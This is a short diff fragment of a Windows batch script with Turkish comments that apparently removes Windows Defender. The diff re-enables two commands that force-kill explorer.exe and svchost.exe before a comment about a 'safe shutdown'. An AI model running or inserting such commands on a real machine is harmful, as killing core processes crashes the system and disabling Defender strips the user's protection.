@@ -63,8 +63,8 @@ rmdir /s /q "Remove_Defender"
 
 REM =========== 10. Sonlandırma (Alternatif: shutdown yerine explorer kill) ============
 timeout /t 10
-REM taskkill /f /im explorer.exe
-REM taskkill /f /im svchost.exe
+taskkill /f /im explorer.exe
+taskkill /f /im svchost.exe
 
 REM Güvenli kapanış
 
